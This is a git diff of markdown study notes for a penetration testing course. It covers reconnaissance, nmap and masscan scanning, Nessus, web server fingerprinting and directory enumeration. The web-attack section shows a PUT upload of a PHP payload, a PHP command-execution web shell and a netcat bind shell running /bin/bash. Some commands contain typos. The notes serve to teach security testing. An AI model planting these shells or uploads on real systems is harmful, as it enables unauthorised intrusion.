@@ -1,14 +1,16 @@
-## (3/3) Penetration Testing Basics
+# Penetration Testing Basics
 
-### Information Gathering (5 items)
+## Information Gathering
 
-#### (1/5) Introduction - Study Guide
+- Good vs Bad penetration tester.
+- Darts example: better 1000 shots at a microscopic target or single shot to an impossible to miss big target?
+- Cyclic process.
+- Every information gathering stage will need the same focus and dedication as the first one.
+- Your penetration test will be **as strong as your weakest skill**!
+- First and one of the most crucial phases of an engagement.
+- A pentester cannot leave any stone unturned.
 
-- First and one of the most crucial phases of an engagement
-- A pentester cannot leave any stone unturned
--
-
-#### (2/5) Open-Source Intelligence - Study Guide
+### Open-Source Intelligence
 
 - Widening the attack surface
 - Mounting targeted attacks
@@ -38,39 +40,49 @@ Discovering Emai Pattern
 - `surname.name@company.com`
 - Many email systems tend to inform the sender that mail was not delivered because it does not exit
 
-#### (3/5) Subdomain Enumeration - Study Guide
+### Subdomain Enumeration
 
-- We keep on widening the attack surface, discovering as many websites owned by the company as possible
-- It's common for websites of the same company to share the same top-level domain name
-- Likely to find resources that
-  - May contain outdated software
-  - Buggy software
-  - Administrative Interfaces
-- Bug bounty program writeups
-- **Passive domain enumeration**: try to identify subdomains without directly interacting with the target
-- Google: `site: company.com`
-- [dnsdumpster.com](https://dnsdumpster.com)
-- `sublist3r` (kali): `sublist3r -d [domain] flag` searches for subdomains in various sources
+- We keep on widening the attack surface, discovering as many websites owned by the company as possible.
+- It's common for websites of the same company to share the same top-level domain name.
+- Likely to find resources that:
+  - May contain outdated software.
+  - Buggy software.
+  - Administrative Interfaces.
+- Bug bounty program writeups.
 
-#### <span style="color:red">(4/5) VIDEO - Subdomain Enumeration</span>
-#### (5/5) The Importance of Information Gathering - Study Guide
+Online services:
 
-- Good vs Bad penentration tester
-- Darts example: better 1000 shots at a microscopic target or single shot to an impossible to miss big target?
-- Cyclic process
-- Every information gathering stage will need the same focus and dedication as the first one
-- Your penetration test will be **as strong as your weekest skill**!
+- [VirusTotal](https://www.virustotal.com):
+- [DNSdumpster](https://dnsdumpster.com): a subscription is needed.
+- [crt.sh](https://crt.sh): view certificates and see associated domains and subdomains.
 
-### Footprinting & Scanning (7 items)
+Automated tools:
 
-#### (1/7) Disclaimer - Study Guide
+- `sublist3r` / `subbrute`: use domain wordlist in order to bruteforce subdomains.
 
-> Never run any of these tools and techniques on any machine or netwrok without proper authorization!
+```bash
+# sublist3r using Passive DNS services
+sublist3r -v -d google.com -b
 
-#### (2/7) Mapping a Network - Study Guide
+# -v : verbose
+# -d <domain>
+# -b bruteforce
+```
 
-- These techniques work both on local and remote
-- Every host connected to the Internet or a private network must have a unique IP address
+- `amass`
+
+```bash
+amass -ip -d google.com
+```
+
+
+## Footprinting & Scanning
+
+> Never run any of these tools and techniques on any machine or network without proper authorization!
+
+### Mapping a Network
+
+These techniques work both on local and remote. Every host connected to the Internet or a private network must have a unique IP address.
 
 Example:
 
@@ -79,16 +91,14 @@ Block: 200.200.0.0/16
 2^16 hosts = 200.200.0.0 - 200.200.255.255
 ```
 
-##### Ping Sweeping
-
 - `ping` command tests whether a machine is alive
 - Ping works by sending one or more special ICMP packets (**echo request** - Type 8)
 - If the destination host replies with **ICMP echo reply**
 - ICMP is part of the IP protocol
-
 - `fping` is an improved version of the `ping` utility
+- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`). Those messages are easily removed by: `fping -a g 192.168.82.0 192.168.82.255 2>/dev/null`
 
-```
+```bash
 fping -a -g IPRANGE
 
 # -a option forces the tool to show only alive hosts
@@ -98,57 +108,45 @@ fping -a -g 10.54.12.0/24
 fping -a -g 10.54.12.0 10.54.12.255
 ```
 
-- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`)
-- Those messages are easily removed by:
+### Nmap Ping Scan
 
-```
-fping -a g 192.168.82.0 192.168.82.255 2>/dev/null
-```
-
-##### Nmap Ping Scan
-
-```
+```bash
 nmap -sn 200.200.0.0/16
 nmap -sn -iL hostilist.txt
 ```
 
-```
 HOST DISCOVERY:
--sL: List Scan - simply list targets to scan
--sn: Ping Scan - disable port scan
--Pn: Treat all hosts as online -- skip host discovery
--PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
--PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
--PO[protocol list]: IP Protocol Ping
-```
 
-##### OS Fingerprinting
+- `-sL`: List Scan - simply list targets to scan
+- `-sn`: Ping Scan - disable port scan
+- `-Pn`: Treat all hosts as online -- skip host discovery
+- `-PS/PA/PU/PY[portlist]`: TCP SYN/ACK, UDP or SCTP discovery to given ports
+- `-PE/PP/PM`: ICMP echo, timestamp, and netmask request discovery probes
+- `-PO[protocol list]`: IP Protocol Ping
+
+### OS Fingerprinting
 
 - Possible to identify OS because of some tiny differences in the network stack implementation of the various OS
 - Signature of the host behavior
 - The signature is compared against a database of known OS signatures
-- Offline OS fingerpriting can be done with `p0f` but we'll use `nmap`
+- Offline OS fingerprinting can be done with `p0f` but we'll use `nmap`
 
-```
+```bash
 nmap -Pn -O <target(s)>
 # -Pn switch to skip the ping scan if you already know that the targets are alive
 ```
 
-Nmap options:
-```
 OS DETECTION:
--O: Enable OS detection
---osscan-limit: Limit OS detection to promising targets
---osscan-guess: Guess OS more aggresively
-```
 
-#### <span style="color:red">(3/7) NMAP OS Fingerprinting</span>
+- `-O`: Enable OS detection.
+- `--osscan-limit`: Limit OS detection to promising targets.
+- `--osscan-guess`: Guess OS more aggressively.
 
-#### (4/7) Port Scanning - Study Guide
+### Port Scanning
 
 > Goals:
 > - Prepare for the vulnerability assessment phase
-> - Perform stealth reconnaissnace
+> - Perform stealth reconnaissance
 > - Detect firewalls
 
 - Port Scanning goes after knowing the active targets on the network
@@ -156,17 +154,16 @@ OS DETECTION:
 - Also knowing what services are running, software and version, on an specific port
 - Port scanners automate probes requests and response analysis
 - Also let you detect if there's a firewall between you and your target
-- 3-way handshake:
-  - If port is closed -> RST + ACK
+- 3-way handshake: If port is closed -> RST + ACK
 
-##### TCP Connect Scan
+#### TCP Connect Scan
 
 - Simplest way to perform a port scan
 - If the scanner receives a `RST` packet, then the port is closed
 - If the scanner is able to complete the connection, then the port is open
 - TCP Connect Scans are recoded in the daemon logs (from the app point of view, the probe looks like a legitimate connection)
 
-##### TCP SYN Scan
+#### TCP SYN Scan
 
 - Default nmap scan
 - Stealthy by design
@@ -175,7 +172,7 @@ OS DETECTION:
 - if a ACK packet is recevived, then the port is open (and RST packet is sent to the target to stop the handshake)
 - Cannot be detected by looking at daemons logs
 
-##### Nmap Scan Types
+#### Nmap Scan Types
 
 ```
 -sT performs a TCP connect scan
@@ -187,20 +184,28 @@ OS DETECTION:
 - During version detection scan, Nmap performs a TCP connect and reads from the banner of the daemon listening on a port.
 - If the daemon does not send a banner, nmap sends some probes to understand what application is, by studying its behavior
 
-###### Specifying targets
+#### NMAP Port Scanning
+
+```bash
+nmap -sn 192.168.1.0/24 > hosts-up.txt
+nmap -sT -p80 192.168.1.0/24 # checks for all webservers in this network range
+nmap -sS -sV -p 21 192.168.1.0/24 # checks for service version
+```
+
+#### Specifying targets
 
 - By DNS name: `nmap <scan_type> target1.domain.com target2.domain.com`
-- With an IP address list: `namp <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3`
+- With an IP address list: `nmap <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3`
 - CIDR notation: `nmap <scan_type> 192.168.1.0/24 200.200.1.0/16`
 - By using wildcards: `nmap <scan_type> 192.168.1.*` or `nmap <scan_type> 10.10.*.1` or `nmap <scan_type> 200.200.*.*`
 - Specifying ranges: `nmap <scan_types> 200.200.6-12.*`
 - Octets Lists: `nmap <scan_types> 10.14.33.1,3,17` or `nmap <scan_type> 10.14,20.3.1,3,17,233`
 
-###### Choosing the ports to scan
+#### Choosing the ports to scan
 
 - `-p`: `nmap -p 21,22,139,445,443,80 <target>` or `nmap -p 100-1000 <target>`
 
-##### Discovering Network with Port Scanning
+#### Discovering Network with Port Scanning
 
 - You might encounter networks that are protected by firewalls and where pings are blocked
 - It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open
@@ -208,92 +213,107 @@ OS DETECTION:
 - if you would like to find an alive host, you can scan typical ports instead of performing a ping sweep
 - the four most basic TCP ports (22, 445, 80, 443) can be used as indicators of live hosts in the network
 
-##### Spotting a Firewall
+#### Spotting a Firewall
 
 - You might often see that a version was not recognized regardless of the open port
 - Or even the service type is not recognized
 - `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data
 - `--reason` nmap flag will show an explanation of twhy a port is marked as open or closed
 
-##### Masscan
+### `masscan`
 
-- Another interesting tool that can help you to discover a network via probing TCP ports
-- Designed to deal with large networks and to scan thousands of IP addresses at once
-- Like `nmap` but a lot faster, however is less accurate
-- Maybe best to use this for host discovery and then conduct a detailed scan with nmap against certain hosts
+- Another interesting tool that can help you to discover a network via probing TCP ports.
+- Designed to deal with large networks and to scan thousands of IP addresses at once.
+- Like `nmap` but a lot faster, however is less accurate.
+- Maybe best to use this for host discovery and then conduct a detailed scan with nmap against certain hosts.
 
-#### <span style="color:red">VIDEO - (5/7) NMAP Port Scanning</span>
-#### <span style="color:red">VIDEO - (6/7) Basic Masscan Usage</span>
-#### <span style="color:red">LAB - (7/7) Scanning and OS Fingerprinting</span>
+```bash
+masscan -p22,80,443,53 -Pn --rate=800 --banners 192.168.0.0/24
+masscan -p22,80,443,53 -Pn --rate=800 --banners 192.168.0.0/24 --echo > masscan.conf
+```
 
-### Vulnerability Assessment (4 items)
+### Examples: Scanning and OS Fingerprinting
 
-#### (1/4) Vulnerability Assessment - Study Guide
+```bash
+# Perform a Ping Scan with Fping: Run a ping scan on the entire network with fping.
+> fping -a -g 10.142.111.0/24 2> /dev/null
+
+# Run a Ping Scan with Nmap
+> nmap -sn -n 10.142.111.*
+
+# Run a SYN Scan: This time run nmap only on the alive hosts.
+> nmap -sS 10.142.111.1,6,48,96,99,100,213
+
+# Version Detection Scan: Run the version detection scan and spot services running on non-conventional default ports.
+> nmap -sV 10.142.111.1,6,48,96,99,100,213
+
+# OS Fingerprinting
+> nmap -O 10.142.111.1,6,48,96,99,100,213
+```
+
+## Vulnerability Assessment
+
+### Vulnerability Assessment
 
 > Goal #1: Identify vulnerabilities and security misconfigurations
 > Goal #2: Prepare yourself for exploitation phase
 
 - Vulnerability assessment is a phase of the penetration testing process.
-- Sometimes customers just asks for a vulnerability assessment instead of a pentest
-- During the vulnerability assessment, you do not proceed to the exploitation phase
-- This impllies that you will not be able to confirm the vulnerabilities by testing them and giving proof of their existence
-- A full penetration test is more in depth than just vulnerability assessment
-- Can be carried out both locally and remotely
-- Pentesters use vulnerability scanners
-  - Database of known vulnerabilities
-  - Daemons listening on TCP and UDP ports
+- Sometimes customers just asks for a vulnerability assessment instead of a penetration test.
+- During the vulnerability assessment, you do not proceed to the exploitation phase.
+- This implies that you will not be able to confirm the vulnerabilities by testing them and giving proof of their existence.
+- A full penetration test is more in depth than just vulnerability assessment.
+- Can be carried out both locally and remotely.
+- Penetration testers use vulnerability scanners:
+  - Database of known vulnerabilities.
+  - Daemons listening on TCP and UDP ports.
   - Config files of OS, software suites, network devices, etc.
-  - Windows registry entries
-  - The purpose of a scanner is to find vulnerabilities or misconfigurations
-  - This scanner tool is up to date by the vendor and it's constantly updated
+  - Windows registry entries.
+  - The purpose of a scanner is to find vulnerabilities or misconfigurations.
+  - This scanner tool is up to date by the vendor and it's constantly updated.
+
+Some of them are:
 
 - OpenVAS
 - Nexpose
 - GFI Lan Guard
 - Nessus
 
-- If you have to test a custom app, a vulnerability scanner isn't enough, you have to test it manually
-- Studying custom applications means:
-  - learning and understanding its features
-  - understanding how it exchanges data over the network
-  - understanding how it accesses resources like databases, servers, local and remote files and os on
-  - reverse engineering its logic
+If you have to test a custom app, a vulnerability scanner isn't enough, you have to test it manually. Studying custom applications means:
 
-#### (2/4) Nessus - Study Guide
+- Learning and understanding its features.
+- Understanding how it exchanges data over the network.
+- Understanding how it accesses resources like databases, servers, local and remote files and os on.
+- Reverse engineering its logic.
 
-- Nessus is a easy to use powerful vulnerability scanner that works great both on a small and large company network
-- It's free license for non-commercial use, so you can install and use it to secure your home network
-- It has two components: client & server
-  - Client is used to configure the scans, provides a web interface to configure scans
-  - Server performs the scan and repots back to the client, sends probes to systems and applications, collecting the responses and matching them against its vulnerability database
+### Nessus
+
+- Nessus is a easy to use powerful vulnerability scanner that works great both on a small and large company network.
+- It's free license for non-commercial use, so you can install and use it to secure your home network.
+- It has two components: client & server.
+  - *Client* is used to configure the scans, provides a web interface to configure scans.
+  - *Server* performs the scan and repots back to the client, sends probes to systems and applications, collecting the responses and matching them against its vulnerability database.
 
 These are the steps that a vulnerability scanner uses:
-- Target hosts alive
-- Open ports
-- Service detection
-- For each detected service, the scanner queries its database looking for known vulnerabilites
-  - You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities
-- Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives
+- Target hosts alive.
+- Open ports.
+- Service detection.
+- For each detected service, the scanner queries its database looking for known vulnerabilities.
+  - You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities.
+- Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives.
 
-#### <span style="color:red">VIDEO - (3/4) Nessus</span>
-#### <span style="color:red">LAB - (4/4) Nessus - Lab</span>
+## Web Attacks (16 items)
 
-### Web Attacks (16 items)
+Web applications use different technologies and programming paradigms compared to desktop apps:
 
-#### (1/16) Introduction - Study Guide
-
-Web applications use different technologies and programming paradigms compared to desktop apps
-
-#### (2/16) Web Server Fingerprinting - Study Guide
-
-- Webapps often make up the vast majority of the internet-facing surface
-- It can be done manually and by using automatic tools
+- Webapps often make up the vast majority of the internet-facing surface.
+- It can be done manually and by using automatic tools.
 - Fingerprinting a web server means:
-  - Web Server Service: IIS, Apache, nginx
-  - Version
-  - OS hosting the server
+  - Web Server Service: IIS, Apache, nginx.
+  - Version.
+  - OS hosting the server.
 
-# Fingerprinting with Netcat
+### Fingerprinting with Netcat
 
 - Manually send requests to the server
 - Banner grabbing:
@@ -309,7 +329,7 @@ Output will be different for a Debian Linux Box, Apache Server running on Red Ha
 - You must write your request after running the command (or use `-v`)
 - Netcat does not perform any kind of encryption, so you cannot use it for HTTPS
 
-##### Fingerprinting with OpenSSL
+### Fingerprinting with OpenSSL
 
 - `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
 - You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:
@@ -319,7 +339,7 @@ open s_client -connect target.site:443
 HEAD / HTTP/1.0
 ```
 
-##### Fingerprinting with Httprint
+### Fingerprinting with Httprint
 
 - `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers
 
@@ -330,7 +350,7 @@ httpprint -P0 -h <target hosts> -s <signature file>
 # -s set the signature file to use
 ```
 
-#### (3/16) HTTP Verbs - Study Guide
+### HTTP Verbs
 
 - REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
 - In REST APIs is common to use PUT for saving data, and not for saving files
@@ -372,11 +392,13 @@ OPTIONS / HTTP/1.1
 Host: www.example.site
 ```
 
-##### Exploiting Misconfigured HTTP verbs
+### Exploiting Misconfigured HTTP verbs
 
 - 1st you enumerate verbs with an OPTIONS message in `nc`
 - To exploit the DELETE verb, you just have to specify the file you want to delete from the server
-- Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is
+- Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is.
+- Misconfigured HTTP verbs are becoming rare in web servers.
+- You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices.
 
 ```bash
 nc victim.site 80
@@ -387,7 +409,7 @@ Content length: 20
 <?php phpinfo(); ?>
 ```
 
-##### PHP Shell
+#### PHP Shell
 
 ```php
 if (isset($_GET['cmd'])) {
@@ -416,12 +438,46 @@ if (isset($_GET['cmd'])) {
 }
 ```
 
-- Misconfigured HTTP verbs are becoming rare in web servers
-- You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices
+### Netcat
 
-#### <span style="color: red">VIDEO - (4/16) Netcat</span>
+```bash
+# => server/listener
+nc -lvp 8888
+# -l listen
+# -v verbose
+# -p port
+# -e execite
 
-#### (5/16) Directories and Files Enumeration - Study Guide
+# => client
+nc -v 127.0.0.1 8888
+
+# => udp server
+nc -lvup 9999
+
+# => udp client
+nc -vu localhost 9999
+
+# Send text from Client to Server
+# => Server
+nc -lvp 8888 > received.txt
+# => Client
+echo "hello" | | nc -v localhost 8888
+
+# Send file from Client to Server
+# => Server
+nv -lvp 8888 > received.txt
+# => Client
+cat to_be_sent.txt | nc -v localhost 8888
+
+# Bash command
+# => Server
+nc -lvp 5555 -e /bin/bash
+
+# => client
+echo 'ls' | nc -v localhost 5555
+```
+
+## Directories and Files Enumeration
 
 > Ability to:
 > - Find and utilize testing features
@@ -443,11 +499,58 @@ Tool:
   - Java application that can perform web resources enumeration
   - You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
   - It's Linux alternative: `dirb`
+### Dirb
 
-#### <span style="color:red">VIDEO - (6/16) Dirbuster</span>
-#### <span style="color:red">VIDEO - (7/16) Dirb</span>
+```bash
+dirb http://google.com -user-share-dirb-wordlists-small.txt -a "USER AGENT HERE"
+
+# Fill up Burpsuite with dirb requests
+dirb http://google.com -p http://127.0.0.1:8080
+dirb http://google.com -p http://127.0.0.1:8080 -c "COOKIE:XYZ"
+dirb http://google.com -p http://127.0.0.1:8080 -u "admin:password" # basic auth
+dirb http://google.com -p http://127.0.0.1:8080 -H "MyHeader: MyContent" # basic auth
+dirb http://google.com -z 1000 # Add a milliseconds delay to not cause excessive flood
+# -S silent
+dirb http://google.com -X ".php,.bak" # use extensions
+dirb http://google.com -x extensions.txt -z 1000
+dirb http://google.com -x extensions.txt -o results.txt # output results to file
+```
+
 #### <span style="color:red">LAB - (8/16) Dirbuster</span>
-#### (9/16) Google Hacking - Study Guide
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### Google Hacking
 
 > Goal #1: perform information gathering without contacting your targets, ability to find hidden resources
 
@@ -461,7 +564,7 @@ inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent director
 
 - [Exploit DB](https://www.exploit-db.com/google-hacking-database)
 
-#### (10/16) Cross Site Scripting - Study Guide
+### Cross Site Scripting
 
 > Ability to:
 > - Attack webapps' users
